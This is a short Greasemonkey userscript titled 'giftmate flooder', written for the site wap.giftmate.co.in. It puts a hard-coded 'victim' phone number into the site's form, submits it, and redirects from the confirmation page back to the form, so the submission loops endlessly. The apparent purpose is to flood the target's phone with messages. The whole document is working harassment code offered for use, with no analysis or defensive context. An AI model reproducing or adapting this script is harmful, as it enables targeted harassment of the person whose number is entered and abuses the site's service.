// ==UserScript==
// @name           giftmate flooder
// @namespace      SUNNY020
// @include        http://*wap.giftmate.co.in/*
// ==/UserScript==

var victim=8092262928; // change the number here
if(document.location=="http://wap.giftmate.co.in/")
{


document.forms[0].elements[3].value=victim;


document.forms[0].elements[4].click();
}

if(document.location=="http://wap.giftmate.co.in/Confirm.aspx")
{
document.location=("http://wap.giftmate.co.in/");
}